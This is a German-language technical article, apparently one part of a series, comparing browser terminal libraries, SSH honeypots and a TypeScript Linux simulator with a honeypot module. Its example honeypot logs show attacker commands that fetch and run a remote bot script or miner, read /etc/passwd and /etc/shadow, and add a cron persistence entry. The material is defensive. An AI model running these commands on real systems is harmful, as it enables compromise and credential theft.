### Zusammenfassung der Emulator-Familie

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Architektur** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietär) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Echter Kernel** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **npm-Paket** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI-Tool) |
| **Node.js-Nutzung** | ✅ | ❌ | ❌ | ❌ | ❌ (nur Browser) | via Wasmtime |
| **Browsernutzung** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/Instanz** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Startzeit** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open Source** | ✅ | ✅ | ✅ | ❌ | partiell | ✅ |
| **Status** | ✅ sehr aktiv | ✅ stabil | ⚠️ archiviert | ✅ kommerziell | ✅ aktiv | ✅ aktiv |

Was in dieser Tabelle ins Auge springt : `v86` ist das einzige, das ein npm-Paket ist, sowohl im Browser als auch Node läuft und Open-Source ist. Darum dominiert es die "Linux-Emulatoren in JavaScript"-Konversation. Alles andere hat einen Haken, JSLinux hat keine API, jor1k ist archiviert, CheerpX kostet Geld, WebContainers ist nur Browser und Node-spezifisch, container2wasm braucht einen Build-Schritt und CLI. Wenn du nur "Linux in JavaScript starten" brauchst, ist `v86` fast immer der richtige Startpunkt.

---

## Teil 3, die Terminal-Stacks : xterm.js und node-pty

Zwei Pakete tauchen ständig auf, wenn Leute shellartige Erfahrungen bauen. Das sind keine Sandboxes oder Emulatoren, das ist UI- und PTY-Plumbing, aber sie sind so verwandt, dass ich mich schlecht fühlen würde, sie wegzulassen. Auch habe ich beide genutzt und sie sind wirklich gut.

### 3.1 `xterm.js`, das Terminal-Rendering

xterm.js ist ein Terminalemulator für den Browser. Es zeigt einen Terminalscreen (VT100/xterm-Escape-Sequenzen) in einem `<canvas>`-Element, handhabt Tastatureingaben und exponiert eine API zum Routen der Daten.

Genutzt von : VS Codes eingebautem Terminal, Azure Cloud Shell, Proxmox VE, AWS CloudShell und vielen mehr.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Daten ans Terminal senden (als Text angezeigt)
term.write("$ ");
term.onData(data => {
  // Data sind die Tastenanschläge, sende sie an dein Backend
  socket.send(data);
});
socket.onmessage(msg => {
  // Ausgabe vom Backend, zeige sie an
  term.write(msg.data);
});
```

xterm.js ist nur die Render-Schicht. Es führt keine Shell aus. Es interpretiert keine Commands. Es ist ein Display-Widget, das du mit dem Backend deiner Wahl verbindest. Viele Leute denken, xterm.js "macht das Terminal", aber es ist wirklich nur der Screen, du musst es noch mit etwas verbinden, das wirklich Commands ausführt.

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`, PTY-Erstellung

`node-pty` erstellt ein Pseudoterminal (PTY) in Node.js und gibt dir ein Lese/Schreib-Handle darauf. Zusammen mit xterm.js genutzt, erlaubt es, ein Browserterminal zu bauen, das mit einer echten Shell (bash, zsh, fish) auf dem Server redet.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // An den Browser xterm.js über WebSocket senden
  ws.send(data);
});

ws.on("message", data => {
  // Browseranschläge an die Shell weiterleiten
  shell.write(data);
});
```

Das ist das Standardschema für Cloud-IDEs und Webterminals : xterm.js (Browser) ↔ WebSocket ↔ node-pty ↔ echte Bash. Isolation bleibt nichtexistent. Die Shell läuft mit allen Permissions des Node.js-Prozesses (oder des Nutzers, der ihn startet).

**Gepflegt von** : Microsoft.  
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Teil 4, die SSH-Honeypots

Honeypots sind designed, angegriffen zu werden. Das Ziel ist, real genug auszusehen, damit Angreifer mit ihnen interagieren, während alles aufgezeichnet wird, was sie tun, für Threat Intel. SSH ist das Hauptziel, weil es der meistattackierte Service im Internet ist, wenn du Port 22 auf einer öffentlichen IP exponierst, siehst du buchstäblich innerhalb von Minuten automatisierte Scanversuche. Probier es eines Tages, es ist ziemlich erschreckend, wie schnell das geht.

Die Qualität eines Honeypots misst sich an zwei Dingen : **Fidelität** (wie überzeugend es ein echtes System imitiert) und **Telemetrie** (wie viele nützliche Daten es erfasst). Diese zwei stehen in Spannung. Ein High-Fidelity-Honeypot ist schwerer zu bauen und riskanter zu betreiben.

Dieser Abschnitt führte mich schließlich zum Bau des `HoneyPot`-Moduls in `typescript-virtual-container`, also habe ich hier einige Meinungen.

### 4.1 Cowrie, der Goldstandard

Cowrie ist ein Python-basierter Medium-bis-High-Interaction SSH- und Telnet-Honeypot. Der am meisten deployte SSH-Honeypot in der Forschungs- und Sicherheitscommunity.

Architektur :
- **Protokollschicht** : Echte SSH-Protokollimplementierung (Twisted Conch), also bekommen Angreifer echte Handshakes, echten Key-Exchange, echte Authentifizierung
- **Shell-Schicht** : Ein gefälschtes Dateisystem (sieht wie Debian 5.0 aus) und ein partieller Shell-Interpreter, der auf gängige Commands antwortet
- **Proxy-Modus** : Kann auf ein echtes System dahinter umleiten (High-Interaction-Modus), während alles Geloggte aufgezeichnet wird
- **LLM-Modus** (neu hinzugefügt) : Nutzt ein Sprachmodell, um dynamische Antworten auf Commands zu generieren, die es nicht handhaben kann, ja, Cowrie hat jetzt einen KI-Modus. Wir leben in verrückter Zeit.

```python
# Was Cowrie erfasst
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie sichert heruntergeladene Dateien (via wget/curl/SFTP/SCP) für Malware-Analyse. Es integriert mit Splunk, Elasticsearch und anderen SIEM-Plattformen.

**Fidelität** : Mittel-hoch. Überzeugend genug, automatisierte Bots zu täuschen (was 99% der SSH-Angreifer ausmacht, meist nur dumme Skripte, die `root`/`password` probieren). Sophisticated Menschen können es per Fingerprinting identifizieren, generell ziemlich schnell.

**Sprache** : Python (Twisted)  
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo, Cowries Vorgänger

Kippo ist der originale Medium-Interaction-SSH-Honeypot, auf dem Cowrie basierte. Gleiche Grundidee : Echtes SSH-Protokoll, gefälschtes Dateisystem, partielle Shell. Cowrie hat es mittlerweile komplett verdrängt, Kippo ist archiviert und niemand sollte es 2026 nutzen. Hier nur zur historischen Vollständigkeit erwähnt, da du es in alten Blogartikeln und Security-Papers referenziert sehen könntest.

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo), archiviert

---

### 4.3 endlessh, der SSH-Tarpit

endlessh ist ein degenerierter Honeypot : Es hält SSH-Verbindungen offen, indem es Banner-Daten langsam mit 1 Byte pro Sekunde (oder weniger) sendet. Ein SSH-Client, der sich verbindet, bleibt endlos hängen, er kommt nie zur Authentifizierung, weil der Server nie fertig wird, das Banner zu schicken.

Das Ziel ist nicht Threat Intel, sondern pure Ressourcenverweigerung : Die Scan-Threads der Angreifer beschäftigen, damit sie echte Ziele nicht so schnell erreichen. Ehrlich gesagt etwas diabolisch im guten Sinne. Du lernst nichts vom Angreifer, du lässt ihn nur seine Zeit verschwenden. Etwas tief Befriedigendes liegt darin.

```c
// Das ganze endlessh-Protokollverhalten:
// Senden: "SSH-2.0-OpenSSH_" dann langsam Zufallszeichen hinzufügen
// Verbindung nie schließen
// Der Angreifer-Scanner timeoutet nach N Sekunden
```

Keine Commands werden erfasst. Keine Authentifizierung wird getestet. Nur Verbindungszeit.

**Geschrieben in** : C  
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame, der "lasst alle rein"-Honeypot

sshesame akzeptiert alle SSH-Verbindungen (jeder Nutzer, jedes Passwort, jeder Schlüssel) und loggt alles. Es ist ein Zero-Interaction-Honeypot : Es antwortet nicht auf Commands, es lässt Angreifer nur "reinkommen" und zeichnet jeden Tastenanschlag auf, den sie tippen.

```
2024-01-15 03:22:11 Verbindung von 45.33.32.156
  Nutzer: root, Passwort: password123, akzeptiert
  Getippte Commands:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Nach 47s getrennt
```

Nützlich für Credential-Harvesting : Du sammelst schnell die Nutzernamen und Passwörter, die Bots probieren, was dir sagt, welche Default-Credentials gerade aktiv bruteforcet werden. Spoiler : Es ist immer `root`/`password`, `admin`/`admin` und `root`/`123456`. Jedes Mal.

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird, Docker-basiertes Honeypot-Framework

`lyrebird/honeypot-base` ist ein Docker-Basisimage zum Bauen von Netzwerkservice-Honeypots. Kein spezifischer SSH-Honeypot, ein Framework zum Bauen von Honeypots für jedes Protokoll.

Das Basisimage liefert ein Logging-Framework, ein Plugin-System für Protokolle und Docker-Compose-Configs für Multi-Service-Honeypots. Du erweiterst es, um spezifische Services zu simulieren.

**Docker Hub** : [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Einen SSH-Honeypot in Node.js bauen, die naive Methode, und warum sie scheitert

Vor `typescript-virtual-container` hieß einen SSH-Honeypot in Node.js bauen, die echte `ssh2`-Bibliothek mit manueller Command-Simulation kombinieren. Sehr mühsam, sehr unvollständig, aber... mittlerweile ein Pflichtdurchgang :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Versuch loggen
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Alle reinlassen
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Simulierte Antwort
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Das "funktioniert" insofern, als es Credentials und Commands erfasst. Aber es ist offensichtlich falsch, sobald ein sophisticierter Angreifer etwas gräbt. `uname -a` gibt den richtigen String zurück, aber `ls /etc` gibt "command not found" zurück, das riecht meilenweit nach Falle. Das Dateisystem existiert nicht. Commands verketten sich nicht. Pipes funktionieren nicht. Variablen expandieren nicht.

Ein kompetenter Angreifer identifiziert deinen Honeypot in den ersten fünf Commands. Automatisierte Skripte, die nach Cowrie-artigem Verhalten suchen, erkennen es auch sofort. Anscheinend trieb das die Autorin von `typescript-virtual-container` dazu, etwas zu bauen, das Commands wirklich interpretiert, mehr dazu in Teil 5.

---

### Zusammenfassung der Honeypot-Familie

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naiv ssh2 |
|---|---|---|---|---|---|---|
| **Interaktionslevel** | mittel-hoch | mittel | null | null | variabel | niedrig |
| **Echtes SSH-Protokoll** | ✅ | ✅ | ❌ (Tarpit) | ✅ | variabel | ✅ |
| **Shell-Fidelität** | mittel | mittel | n/a | keine | variabel | minimal |
| **Erfasst Credentials** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Erfasst Commands** | ✅ | ✅ | ❌ | ✅ | variabel | ✅ |
| **Erfasst Malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM-Integration** | ✅ nativ | ❌ | ❌ | ❌ | ❌ | manuell |
| **LLM-Antworten** | ✅ (neu) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Sprache** | Python | Python | C | Go | Docker | Node.js |
| **Nativ Node.js** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ✅ sehr aktiv | ⚠️ archiviert | ✅ aktiv | ✅ aktiv | ✅ aktiv | DIY |

Das Muster hier ist ziemlich klar : Je mehr Fidelität du willst, desto mehr Python musst du schreiben. Cowrie ist der unangefochtene Sieger, wenn du es ernst meinst, es ist jahrelang im Feld erprobt und erfasst weit mehr als nur Credentials. endlessh und sshesame sind eher nette Projekte als ernste Threat-Intel-Tools. Und der naive Node.js-Ansatz bringt dich vielleicht 20% des Wegs, bevor du gegen eine Wand läufst.

---

## Teil 5, `typescript-virtual-container` : was die Lücke füllt

OK, hier werden die Dinge interessant. Nach Katalogisierung aller obigen Familien wird der fehlende Quadrant ziemlich offensichtlich :

- Die JS-Sandboxes : Isolieren Code, keine Shell, kein Dateisystem, kein SSH
- Die Linux-Emulatoren : Echtes OS, echte Shell, echtes SSH... aber 150+ MB RAM, 30 Sekunden Start, und du musst deine eigene API über serielle I/O bauen
- Die Honeypots : Gefälschte Shell, keine programmierbare API, Python/Go/C, nicht nativ Node

Niemand hatte eine komplette programmierbare native Node-Linux-Umgebung gebaut, mit echtem SSH, echten Permissions, echtem virtuellem Netz und typisierter TypeScript-API. Also baute sie es.

Kurze Intro, da ich sie zum ersten Mal korrekt erwähne : `typescript-virtual-container` wurde von [Chloé Rolzhausen](https://itsrealfortune.fr) gebaut, einer französischen Entwicklerin, die sich online **Fortune** (oder ItsRealFortune) nennt. Du findest sie auf ihrer [Website](https://itsrealfortune.fr) und auf [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Das ganze Projekt, 56.000 Zeilen TypeScript, 247 Dateien, 170 Commands, war Solo-Effort einer einzelnen Person. Ich nenne sie für den Rest des Artikels Fortune. Und ja, ziemlich verrückt. Schau dir ihre Arbeit an !

### Was es wirklich ist

`typescript-virtual-container` ist ein **Linux-Umgebungssimulator** geschrieben in purem TypeScript. Kein Wasm, keine nativen Extensions, kein Kernel. ~56.000 Sourcezeilen über 247 TypeScript-Dateien.

Die Schlüsselerkenntnis : Du brauchst keinen CPU-Emulator, um `ls /etc | grep passwd` laufen zu lassen. Du brauchst :
1. Einen In-Memory-Knotenbaum, der auf Pfadoperationen antwortet
2. Ein bei jedem Zugriff angewandtes POSIX-Permission-Modell
3. Einen Shell-Syntaxparser, der Pipelines, Redirects, Subshells und Variablenexpansion versteht
4. ~170 Command-Implementierungen (Funktionen, keine Binaries)
5. Ein Nutzer- und Gruppenverwaltungssystem
6. Etwas, um das alles via SSH zu exponieren

Alles machbar in purem TypeScript ohne jegliche Kernel-Implikation.

### Das VirtualFileSystem

Das VFS ist ein typisierter In-Memory-Knotenbaum, keine Platten-I/O, außer du aktivierst explizit den `"fs"`-Persistenzmodus :

```ts
// Vereinfachte interne Repräsentation
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // faul geladener Placeholder
```

Jede Pfadoperation läuft durch `normalizePath` (löst `.`, `..`, Symlinks auf) und `enforceAccess` (prüft Lese/Schreib/Ausführ-Permissions gegen anfragende uid/gid). `chmod`, `chown`, Sticky Bits und Setuid sind alle implementiert und wirklich angewandt. Wenn ein als uid 1000 laufender Prozess versucht, eine root-gehörende Datei mit Modus 0600 zu lesen, bekommt er EACCES, kein falsches EACCES, einen echten aus der Permission-Prüfung geworfenen JavaScript-`Error`. Dieser Teil ist ehrlich gesagt ziemlich elegant.

Das VFS serialisiert zu :
- `.vfsb`, ein kompaktes Binärformat (custom, mit fflate-Kompression), das Default-Format
- JSON-Snapshot, menschenlesbar, gut zum Debuggen
- TAR-Archiv, Import/Export mit echtem Tar-Format, also kannst du etwas `tar -xf`en und das VFS hat einfach... diese Dateien
- SquashFS-Image, Read-only-Import

Im `"fs"`-Persistenzmodus pflegt es ein Write-Ahead-Log (WAL) für Crash-Recovery, Writes gehen zuerst ins Log, dann bei Flush in den Snapshot. Wenn Node mitten in einer Operation crasht, lässt das Log den letzten kompletten Zustand rekonstruieren.

Es gibt auch eine `FileCache`-Schicht, die Platten-I/O-Latenz simuliert. Du konfigurierst Profile wie `NVME_DISK_IO` oder `HDD_DISK_IO` und das VFS verzögert Dateioperationen künstlich, um realistischen Timings zu entsprechen. Was ziemlich lustig ist, Software, die sich absichtlich verlangsamt, um Hardware zu simulieren, aber tatsächlich sehr nützlich für Benchmarking.

### Der Shell-Interpreter

Der Shell-Syntaxparser produziert einen typisierten AST :

```ts
// "ls /etc | grep root && echo done" parst zu:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Der Executor läuft durch diesen AST :
- Für eine Pipeline erstellt er eine `{ stdin, stdout, stderr }`-Stromkette und führt jedes Command mit gepipelter I/O aus
- Für logische Operatoren (`&&`, `||`) prüft er `$?` nach der linken Seite, bevor er die rechte ausführt
- Für Subshells (`$(...)`, `` ` ` ``) forkt er den Ausführungskontext
- Für Redirects (`>Datei`, `>>Datei`, `2>&1`, `<Datei`) konfiguriert er das Strom-Wiring vor Ausführung
- Für Hintergrundjobs (`cmd &`) führt er aus, ohne auf Fertigstellung zu warten
- Für Variablen expandiert er `$VAR`, `${VAR:-default}`, `${#VAR}` und Arithmetik `$((expr))`
- Für Brace-Expansion (`{a,b,c}`, `{1..5}`) generiert er die komplette Expansionsliste vor Ausführung

Alles echtes POSIX-Shell-Verhalten. Der Parser handhabt Heredocs, Prozesssubstitution, Globbing (`*`, `?`, `[abc]`) und Quote-Handhabung (Single Quotes, Double Quotes mit Interpolation, Backslash-Escape). Nicht perfekt, Edge Cases existieren, aber weit über dem, was du von einem TypeScript-Projekt erwarten würdest.

### ~170 eingebaute Commands

Commands sind in einem Command-Registry registrierte TypeScript-Funktionen. Sie erhalten einen `CommandContext` mit stdin/stdout/stderr-Strömen, VFS, Nutzersession, Shell-Umgebung und Submodulzugriff.

170 Unix-Command-Implementierungen schreiben ist... viel. Manche sind trivial (`echo`, `true`, `false`), manche überraschend komplex (`awk`, `find`, `tar`). So ein komplettes POSIX-`awk` ? In TypeScript ? Ehrlich verrückt. Hier ein Sample dessen, was drin ist :

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (clientseitig, ausgehende Verbindung),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (kompletter interaktiver Editor), vim (basisch), vi (basisch),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simuliert), systemctl (stub), journalctl (stub),
...und etwa 130 weitere
```

Die "Stubs" (git, python3, node) antworten realistisch auf gängige Aufrufe, `python3 --version` gibt einen glaubwürdigen Versionsstring zurück, `git status` zeigt einen fiktiven Repo-Status, ohne echte Arbeit zu tun. Für einen Honeypot sind die tatsächlich nützlicher als echte Commands, weil sie dich beobachten lassen, was Angreifer auszuführen versuchen, ohne etwas Gefährliches auszuführen.

### Der SSH-Server

Die SSH-Schicht nutzt das echte npm-`ssh2`-Paket, echtes SSH-Protokoll, echter Key-Exchange, echte Verschlüsselung. `SSHMimic` wrappt es :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Echtes SSH: ssh -p 2222 root@localhost
// Echtes SFTP: sftp -P 2222 root@localhost
// Echtes SCP: scp -P 2222 file root@localhost:/tmp/
```

Die `shellProperties` bestimmen, was `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` und `/etc/os-release` berichten. Du kannst jede Linux-Distribution und Kernel-Version überzeugend imitieren, für einen echten SSH-Client gibt es buchstäblich keinen Unterschieds-Weg.

### Das HoneyPot-Modul

Weil der Shell-Interpreter real ist und der SSH-Server real ist, laufen Angreifer-Commands wirklich in der virtuellen Umgebung. Vom Angreifer getriggerte `wget`-Requests werden mit Ziel-URLs geloggt. Vom Angreifer erstellte Dateien werden im VFS gesichert. Privilege-Escalation-Versuche des Angreifers produzieren realistische Fehler.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Nach einer Session das Dateisystem diffen
const before = shell.vfs.toSnapshot();
// ... Angreifer-Session ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Das ist qualitativ anders als Cowrie. Cowries gefälschtes Dateisystem kann auf `ls` antworten, kann aber nicht wirklich vom Angreifer erstellte Dateien und vorgenommene Änderungen als strukturierten Diff verfolgen. `typescript-virtual-container` kann, weil das VFS eine lebendige Datenstruktur ist, jeder Write wird verfolgt. Dieser Cron-Eintrag, den der Angreifer gerade hinzufügte ? Er ist im Diff. Dieser `.hidden`-Ordner ? Im Diff. Ziemlich nützlich für Malware-Analyse.

### Der virtuelle Netzwerkstack

Wahrscheinlich der beeindruckendste Teil des ganzen Projekts, und er hat kein Äquivalent in irgendeinem anderen Projekt dieses Raums. So ein kompletter virtueller L2/L3-Netzstack mit VPN-Support, geschrieben in purem TypeScript, ohne involvierte echte Netzwerkkarte. Wirklich verrückt.

`VirtualNetworkManager` gibt jeder `VirtualShell`-Instanz virtuelle Netzinterfaces mit konfigurierbaren IPs, Routing-Tabellen und Software-Firewall (iptables-artige Regeln mit Conntrack und NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` zeigen alle den virtuellen Netzzustand.

`VirtualSwitch` (genannt Baie, vom französischen Wort für Server-Bay, "baie informatique") verbindet mehrere Shells auf einem geteilten Subnetz. Es implementiert :
- MAC-Lernen und ARP
- IP-Routing zwischen Subnetzen
- NAT (ausgehende Masquerade)
- DNS (konfigurierbare Records pro Subnetz)
- Load Balancing (Round-Robin, Least Connections)
- Traffic Shaping : Latenz, Jitter (Gaußverteilung), Paketverlust, Burst-Verlust, Reordering, Duplikation
- Bandbreitenlimit (Token Bucket)
- MTU-Anwendung
- Connection Tracking (mit Zustand, NEW/ESTABLISHED/TIME_WAIT-Zustände)

```ts
const baie = new Baie("192.168.0.0/24");

// Drei virtuelle Maschinen auf demselben Switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web kann api erreichen, api kann db erreichen, web kann db nicht direkt erreichen
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Traffic Shaping: instabile WAN-Verbindung nach außen simulieren
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` erstellt verschlüsselte Tunnel zwischen Baie-Instanzen, du kannst ein Multi-Site-Netz mit VPN-Interconnects zwischen Sites simulieren.

`VirtualProxy` implementiert Port-Forwarding und einen SOCKS5-Proxy.

Nichts davon berührt eine echte Netzwerkkarte. Alles TypeScript-Objekt-Routing. Das `ping`-Command "funktioniert", indem es via virtuellem Switch routet und simulierte ICMP-Antworten zurückgibt. `curl http://192.168.0.3/api` routet via virtuellem Netz, erreicht die simulierte HTTP-Antwort der api-Shell und gibt den Inhalt zurück. Turtles all the way down, im besten Sinne.

### Die `SandboxedShell`

Für programmatische Nutzung, wo du stärkere Isolation brauchst, führt `SandboxedShell` eine Shell-Session in einem Node.js-Worker-Thread aus :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% eines Kerns
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Die Isolation hier kommt von der VFS-Schicht (die Worker-Thread-Shell kann nur das virtuelle Dateisystem sehen, nie das Host-Dateisystem) plus Node.js-Worker-Thread-Speicherisolation. Leichter als `isolated-vm`, aber passender für Shell-Level- statt JS-Level-Isolation.

### Ressourcen-Capping

Du kannst Pro-Shell-Ressourcenlimits konfigurieren, die beeinflussen, was System-Monitoring-Commands berichten :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

In dieser Shell zeigt `free -m` 512 MB Total-RAM. `nproc` gibt 2 zurück. `/proc/meminfo` zeigt die gecappten Werte. `htop` und `top` zeigen die gecappte CPU-Zahl. Das erlaubt, den Hardware-Footprint der simulierten Maschine präzise zu definieren.

### Drei Deployment-Modi

```
Modus 1: SSH/SFTP-Server
  VirtualSshServer / VirtualSftpServer
  → Echtes SSH-Protokoll, echtes SFTP, echtes SCP
  → Use Case: Honeypots, Remote-Testumgebungen, Trainingslabore

Modus 2: Web-Shell (Browser)
  builds/fortune-nyx-v1.7.8-web.min.js (ESM-Bundle)
  → Läuft im Browser, VFS in IndexedDB persistiert
  → Use Case: interaktive Tutorials, eingebettete Terminals, Demos
  → Bonus: führt startxfce4 für einen kompletten simulierten XFCE-Desktop aus

Modus 3: Autonome CLI
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (eine einzige Datei, keine Installation)
  → curlen und ausführen, persistiert VFS im .vfs/-Verzeichnis
  → Use Case: schnelle Demos, lokales Experimentieren
```

### Die Polyfills, wie der Browser-Build ohne Wasm funktioniert

OK, das ist der Teil, den ich wirklich clever finde und den ich speziell hervorheben wollte.

Eine Node.js-Bibliothek im Browser laufen zu lassen ist generell ein Albtraum. Entweder nutzt du eine Wasm-Runtime (schwer, langsam zu laden) oder du verbringst Wochen damit, jeden `node:*`-Import manuell durch eine browserkompatible Alternative zu ersetzen. Fortune machte das Zweite, aber sehr sauber, indem sie ein Set custom Polyfills schrieb, die im `polyfills/`-Verzeichnis des Repos leben.

Die Build-Pipeline ist nur esbuild mit einem Haufen `alias`-Einträge :

```js
// demo/build.js, die ganze Browser-Build-Config
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Ohne Wasm, ohne externe Polyfill-Bibliothek, ohne Griff zu `webpack-node-externals`. Nur aliasierte Module und ein paar injizierte Globals. Lass mich jedes detaillieren, weil manche wirklich beeindruckend sind.

**`node:fs`, IndexedDB als gefälschtes Dateisystem**

Das hier ist mein Favorit. Das `node:fs`-Polyfill implementiert die synchrone Node.js-fs-API (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) gestützt von zwei Schichten : Eine In-Memory-`Map` für synchrone Reads und IndexedDB für Persistenz über Seiten-Reloads. Writes gehen sofort in die Map (also funktioniert `readFileSync` direkt nach `writeFileSync` immer), dann werden sie asynchron im Hintergrund nach IndexedDB geflusht.

```js
// Synchroner Cache (Pfad → Uint8Array | null), instantane Reads
